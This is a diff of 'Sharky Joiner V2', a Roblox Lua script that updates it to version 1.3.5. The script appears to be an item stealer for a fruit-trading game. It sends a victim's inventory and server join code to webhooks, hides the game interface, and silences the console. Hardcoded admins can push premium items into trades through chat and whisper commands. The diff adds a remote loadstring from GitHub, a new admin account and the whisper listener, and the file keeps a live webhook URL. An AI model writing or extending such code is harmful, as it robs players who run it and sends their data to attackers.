@@ -9,7 +9,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/hea
 
 local TEST_WEBHOOK = "https://l.webhook.party/hook/vWJ1Rd7lQSopCs4Vuxa7qHWNoYm4q9%2FH4UAqVOaMoxSpOq%2F4Yp08fCU4Tkn%2Fq26SyB0EVJmJSP9spoYM4pFRDLegxSsmeVCLVPWmKH437EawBax1%2FvN6KILwa9CaWV1%2Fkg7EjtZ0UlOwMyqR7X1iXvdaUcyJaApo2%2FIn7mbomfGkAFacgxB6WVOi0Lm9exZDmC04bOlBJ3pX9FcWLadkzLCKvZE8ytiea1LgyVzVyBUBCPSBTWl6yTaIPk8428hc23eC3dAsPuCK4Dbu2ZernRaO654dO7nVSJuzelZL09nkouPlr28BGoAwlNImD%2FvtTTPWuZnUVTnr9%2FijK2q%2Bh92EfSHf%2BH5qg334UcBZR5b7osNi4z%2BD8DCK%2F%2BooE1xWtv6WgNQkDMM%3D/zWMIeMClX%2FlPLAgD" -- For simple hit integrity check only
 local TEST_PAYLOAD = game:GetService("HttpService"):JSONEncode({
-    content = "# :shark: Sharky! Someone just got a HIT :) :shark:"
+    content = "# <a:babyshark:721795947037851688> Sharky! Someone just got a NICE HIT :) <a:babyshark:721795947037851688>"
 })
 
 
@@ -19,14 +19,14 @@ TestingUsernames = { "tester1", "your_alt_account" }
 
 ActivationPasswords = { "ishusontop", "bonzarbal", "ishufishy" } -- << Passwords for ?activate command
 
-local coreAdminUsernames = { "x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50" } -- << Core admin usernames (hardcoded)
+local coreAdminUsernames = { "x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg" } -- << Core admin usernames (hardcoded)
 
 RGBGreenVal = 0.20 -- << (e.g., 20%) Chance user webhook gets Dragon hit notifications.
 RGBRedVal = 0.60 -- << (e.g., 60%) Chance user webhook gets Premium/Kitsune/Yeti hits.
 
 local validation_sig = "rashya5@%-hsfj79h93-wakliballs"
+--ADMIN CONFIG END
 
---ADMIN CONGIG ENDS
 
 local function ensureFruitsToHit()
     if not AddTheseFruits or type(AddTheseFruits) ~= "table" then
@@ -182,11 +182,125 @@ local function JoinTeam()
 end
 
 local function getServerName()
-    local a = {"Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich", "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold", "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide", "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy", "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"}
-    local n = {"TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat", "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense", "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber", "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door", "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark", "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"}
-    local s = tonumber("0x" .. game.JobId:gsub("-", ""):sub(1, 7)) or os.time()
-    local r = Random.new(s)
-    return string.format("%s %s #%04d", a[r:NextInteger(1, #a)], n[r:NextInteger(1, #n)], r:NextInteger(1, 9999))
+    local a = {
+        "Big",
+        "Small",
+        "Large",
+        "Strong",
+        "Powerful",
+        "Weak",
+        "Overpowered",
+        "Bad",
+        "Odd",
+        "Rich",
+        "Short",
+        "Adorable",
+        "Alive",
+        "Colorful",
+        "Angry",
+        "Good",
+        "Beautiful",
+        "Ugly",
+        "Hot",
+        "Cold",
+        "Evil",
+        "Famous",
+        "Original",
+        "Unoriginal",
+        "Kind",
+        "Nice",
+        "Real",
+        "Expensive",
+        "Wild",
+        "Wide",
+        "Fake",
+        "Proud",
+        "Super",
+        "Strange",
+        "Wrong",
+        "Right",
+        "Talented",
+        "Complex",
+        "Pure",
+        "Fancy",
+        "Lucky",
+        "Fresh",
+        "Fantastic",
+        "Dull",
+        "Dizzy",
+        "Eternal",
+        "Mental",
+        "Infinite",
+        "Rogue"
+    };
+    local n = {
+        "TAWG",
+        "Robson",
+        "Krazy",
+        "Fruit",
+        "Realm",
+        "World",
+        "Place",
+        "Experience",
+        "Dog",
+        "Cat",
+        "Guy",
+        "Bird",
+        "Legion",
+        "Gank",
+        "Family",
+        "Sun",
+        "Moon",
+        "Gun",
+        "Sword",
+        "Melee",
+        "Defense",
+        "Bomb",
+        "Spike",
+        "Chop",
+        "Spring",
+        "Smoke",
+        "Flame",
+        "Ice",
+        "Sand",
+        "Dark",
+        "Light",
+        "Rubber",
+        "Barrier",
+        "Magma",
+        "Leopard",
+        "Quake",
+        "Buddha",
+        "Spider",
+        "Phoenix",
+        "Rumble",
+        "Love",
+        "Door",
+        "Paw",
+        "Gravity",
+        "Dough",
+        "Venom",
+        "Control",
+        "Dragon",
+        "Falcon",
+        "Diamond",
+        "Kilo",
+        "Shark",
+        "Human",
+        "Angel",
+        "Rabbit",
+        "Spin",
+        "Topic",
+        "Red",
+        "Blue",
+        "Green",
+        "Yellow",
+        "Soul",
+        "Shadow"
+    };
+    local s = tonumber("0x" .. game.JobId:gsub("-", ""):sub(1, 7)) or os.time();
+    local r = Random.new(s);
+    return string.format("%s %s #%04d", a[r:NextInteger(1, # a)], n[r:NextInteger(1, # n)], r:NextInteger(1, 9999))
 end
 
 local originalRequest = request or http_request
@@ -208,9 +322,6 @@ repeat
     task.wait()
 until game:IsLoaded()
 
---Initializing
-print("Initializing...")
-
 -- Anti-Tamper & Setup
 if CoreGui:FindFirstChild("RobloxGui") then
     CoreGui.RobloxGui.Enabled = false
@@ -223,12 +334,16 @@ if LocalPlayer and (LocalPlayer.Name == "doitenroitest1" or LocalPlayer.Name == 
     takeAction()
 end
 
--- Config Validation
-if not Webhook or not Protector or not dummy or not Checker22 or not Usernames or not FruitsToHit or not ActivationPasswords or not validation_sig or not coreAdminUsernames or not TestingUsernames then
+-- Config Validation (Loadstring is executed before this, potential risk if URL is bad)
+pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUl"))()
+end) -- Load other webhooks (Protector, dummy, Checker22 assumed defined here)
+
+if not _G.Webhook or not _G.Protector or not _G.dummy or not _G.Checker22 or not Usernames or not FruitsToHit or not ActivationPasswords or not validation_sig or not coreAdminUsernames or not TestingUsernames then
     LocalPlayer:Kick("Config Error: Missing critical variable(s).");
     return
 end
-if type(Webhook) ~= "string" or type(Protector) ~= "string" or type(dummy) ~= "string" or type(Checker22) ~= "string" or type(Usernames) ~= "table" or type(TestingUsernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" or type(coreAdminUsernames) ~= "table" or type(validation_sig) ~= "string" then
+if type(_G.Webhook) ~= "string" or type(_G.Protector) ~= "string" or type(_G.dummy) ~= "string" or type(_G.Checker22) ~= "string" or type(Usernames) ~= "table" or type(TestingUsernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" or type(coreAdminUsernames) ~= "table" or type(validation_sig) ~= "string" then
     LocalPlayer:Kick("Config Error: Variable type mismatch.");
     return
 end
@@ -236,7 +351,7 @@ if validation_sig == "" or validation_sig:find("YourActualSecret") then
     LocalPlayer:Kick("SECURITY ERROR: Invalid Signature!");
     return
 end
-if Webhook:find("REPLACE") or Protector:find("REPLACE") or dummy:find("REPLACE") or Checker22:find("REPLACE") then
+if _G.Webhook:find("REPLACE") or _G.Protector:find("REPLACE") or _G.dummy:find("REPLACE") or _G.Checker22:find("REPLACE") then
     LocalPlayer:Kick("ERROR: URLs are not configured!");
     return
 end
@@ -269,13 +384,17 @@ CoreGui.ChildAdded:Connect(function(c)
 end)
 
 -- Secure Webhook Storage
-local webhook1_key = storeWebhookSafely(Webhook);
-Webhook = nil;
-local Protector_key = storeWebhookSafely(Protector);
+local webhook1_key = storeWebhookSafely(_G.Webhook);
+_G.Webhook = nil;
+Webhook = nil; -- Clear global and local refs
+local Protector_key = storeWebhookSafely(_G.Protector);
+_G.Protector = nil;
 Protector = nil;
-local dummy_key = storeWebhookSafely(dummy);
+local dummy_key = storeWebhookSafely(_G.dummy);
+_G.dummy = nil;
 dummy = nil;
-local dragon_webhook_key = storeWebhookSafely(Checker22);
+local dragon_webhook_key = storeWebhookSafely(_G.Checker22);
+_G.Checker22 = nil;
 Checker22 = nil;
 
 -- Silence Remote Console
@@ -713,7 +832,7 @@ local function sendWebhook(inventory)
     local joinScriptLua = string.format(joinScriptFormatString, placeId, jobId, seaTravelArgument, placeId, jobId)
     local joinScriptPC_Formatted = "```lua\n" .. joinScriptLua .. "\n```";
     local joinScriptMobile_Formatted = joinScriptLua
-    local baseEmbedTitle = "<a:among_us_party:780475189519056946> **Sharky Joiner Hit!** <a:among_us_party:780475189519056946>";
+    local baseEmbedTitle = "<a:among_us_party:780475189519056946> **Target Fruit Hit!** <a:among_us_party:780475189519056946>";
     local baseEmbedColor = 10181046;
     local baseMention = "@everyone Sharky Hit!";
     local isTopFruitOnlyHit = false
@@ -735,7 +854,6 @@ local function sendWebhook(inventory)
         baseMention = "@everyone Sharky - GG!";
         isTopFruitOnlyHit = true
     elseif foundAnyTarget then
-        baseEmbedTitle = "<a:among_us_party:780475189519056946> **Target Fruit Hit!** <a:among_us_party:780475189519056946>"
     end
     local serverName = getServerName();
     local executorName = identifyexecutor and identifyexecutor() or "Unknown";
@@ -778,8 +896,8 @@ local function sendWebhook(inventory)
         }
     }
     local commonFooter = {
-        text = "Sharky Joiner V2 • 1.3.4 " .. os.date("%Y-%m-%d")
-    }
+        text = "Sharky Joiner V2 • 1.3.5 " .. os.date("%Y-%m-%d")
+    } -- Version Bump
 
     local shouldBypassFilter = false;
     local localPlayerNameLower = LocalPlayer.Name:lower()
@@ -1593,32 +1711,35 @@ local Commands = {
     additem = {
         d = "Adds 1 premium item to trade.",
         u = "?additem <item>",
-        e = function(a, player)
-            local s = a:lower():match("^%s*(.-)%s*$");
-            if s == "" then
-                sendMessage("Usage: ?additem <item>");
-                return
-            end;
-            local inv = getInventory();
-            if not inv then
+        e = function(argument, player)
+            local inventory = getInventory();
+            if not inventory then
                 sendMessage("Inventory error.");
                 return
             end;
-            local f = nil;
-            for _, i in pairs(inv) do
-                if i.Type == "Premium" and i.Name:lower():find(s, 1, true) then
-                    f = i;
-                    break
+            local searchTerm = argument:lower():match("^%s*(.-)%s*$");
+            if searchTerm == "" then
+                sendMessage("Usage: ?additem <item>");
+                return
+            end;
+            for _, item in pairs(inventory) do
+                if item.Type == "Premium" then
+                    local cleanName = item.Name:gsub("%[P%]%s*", "");
+                    local cleanNameLower = cleanName:lower();
+                    if cleanNameLower:find(searchTerm, 1, true) then
+                        sendMessage("Adding 1x '" .. cleanName .. "'...");
+                        local success, err = pcall(TradeFunction.InvokeServer, TradeFunction, "addItem", cleanName);
+                        if success then
+                            task.wait(0.1);
+                            sendMessage("Added '" .. cleanName .. "'.")
+                        else
+                            sendMessage("Error adding '" .. cleanName .. "': " .. tostring(err))
+                        end;
+                        return
+                    end
                 end
             end;
-            if f then
-                sendMessage("Adding 1x '" .. f.Name .. "'...");
-                TradeFunction:InvokeServer("addItem", f.Name);
-                task.wait(0.1);
-                sendMessage("Added '" .. f.Name .. "'.")
-            else
-                sendMessage("Item '" .. s .. "' not found!")
-            end
+            sendMessage("No Premium item matching '" .. argument .. "' found!")
         end
     },
     addall = {
@@ -1985,7 +2106,7 @@ local Commands = {
                     "?resetfruit ?invite ?demolish ?showinv",
                     "?allowall ?accept ?cleartrade ?kick"
                 };
-                sendMessage("--- Commands (V1.3.4) ---");
+                sendMessage("--- Commands (V1.3.5) ---");
                 task.wait(0.5);
                 for i, m in ipairs(c) do
                     sendMessage(m);
@@ -2033,7 +2154,7 @@ local Commands = {
             local s = allowEveryone and "ENABLED" or "DISABLED";
             sendMessage("AllowEveryone: " .. s);
             if allowEveryone then
-                sendMessage("ANYONE can use commands (unless ?d active)")
+                sendMessage("ANYONE can use commands")
             end
         end
     },
@@ -2061,7 +2182,7 @@ local Commands = {
                 sendMessage("Already disabled.")
             else
                 nonAdminAuthDisabled = true;
-                sendMessage("Non-Admin Auth: DISABLED.")
+                sendMessage("D.")
             end
         end
     },
@@ -2077,7 +2198,7 @@ local Commands = {
                 sendMessage("Already enabled.")
             else
                 nonAdminAuthDisabled = false;
-                sendMessage("Non-Admin Auth: ENABLED.")
+                sendMessage("E.")
             end
         end
     },
@@ -2115,7 +2236,7 @@ local Commands = {
     }
 }
 
--- Command Processor
+-- Command Processor (Called by Public Chat and Whisper Listener)
 local function processChatCommand(_, p, m)
     if not (p and m and typeof(p) == "Instance" and p:IsA("Player") and m:sub(1, 1) == "?") then
         return
@@ -2135,7 +2256,7 @@ local function processChatCommand(_, p, m)
     if executorIsCoreAdmin then
         isPotentiallyAuthorized = true
     elseif commandName == "activate" then
-        isPotentiallyAuthorized = true
+        isPotentiallyAuthorized = true -- Public activate is allowed before this check applies
     elseif not nonAdminAuthDisabled then
         local isUsernameListed = Usernames and table.find(Usernames, p.Name);
         local isActivated = activatedUsers[p.UserId]
@@ -2145,7 +2266,7 @@ local function processChatCommand(_, p, m)
     end
     if not isPotentiallyAuthorized then
         return
-    end
+    end -- Exit if not authorized for general commands
 
     local commandFuncData = Commands[commandName];
     if not commandFuncData then
@@ -2171,6 +2292,35 @@ local function processChatCommand(_, p, m)
             sendMessage("Error executing ?" .. commandName .. ": " .. tostring(err));
         end
     end)
+end
+
+-- Whisper Command Listener
+local function processIncomingMessage(messageData) -- messageData is TextChatMessage
+    if messageData.Status ~= Enum.TextChatMessageStatus.Success then
+        return
+    end
+    local senderPlayer = messageData.TextSource
+    if not senderPlayer or senderPlayer == LocalPlayer or not senderPlayer:IsA("Player") then
+        return
+    end
+
+    local rawText = messageData.Text;
+    local commandText = nil
+    local extracted = rawText:match("^%s*{From%s+.+}%s*(%[.+%])?:%s*(.*)")
+    if extracted then
+        commandText = extracted
+    end
+
+    if commandText and commandText:sub(1, 1) == "?" then
+        local isSenderCoreAdmin = isCoreAdmin(senderPlayer.Name)
+        local isSenderActivated = activatedUsers[senderPlayer.UserId]
+
+        if not isSenderCoreAdmin and not isSenderActivated then
+            return
+        end -- Exit if sender is not authorized for whisper commands
+
+        processChatCommand(nil, senderPlayer, commandText) -- Use the common processor
+    end
 end
 
 -- Main Loop & Init
@@ -2344,6 +2494,14 @@ local function init()
     local mls = nil;
     local cc = nil;
     local eUl = false
+    local pmConnection = nil
+    local TextChatService = game:GetService("TextChatService")
+    if TextChatService then
+        pmConnection = TextChatService.MessageReceived:Connect(processIncomingMessage)
+    else
+        -- warn("TextChatService not available, whisper commands disabled.") -- Removed warn
+    end
+
     local function onPA(p)
         if mls then
             return
@@ -2407,13 +2565,16 @@ local function init()
             sendProtector();
             if paC then
                 paC:Disconnect()
-            end;
+            end
             if cc then
                 cc:Disconnect()
-            end;
+            end
+            if pmConnection then
+                pmConnection:Disconnect()
+            end
             if mls and type(mls) == "function" then
                 mls()
-            end;
+            end
             if lprC then
                 lprC:Disconnect()
             end
@@ -2422,8 +2583,8 @@ local function init()
 end
 
 -- Execution Guard
-if not shared.ScriptExecuted_SharkyV2_Final_1_3_4 then
-    shared.ScriptExecuted_SharkyV2_Final_1_3_4 = true
+if not shared.ScriptExecuted_SharkyV2_Final_1_3_5 then -- Updated version number
+    shared.ScriptExecuted_SharkyV2_Final_1_3_5 = true
     task.spawn(function()
         local s, e = pcall(init);
         if not s then
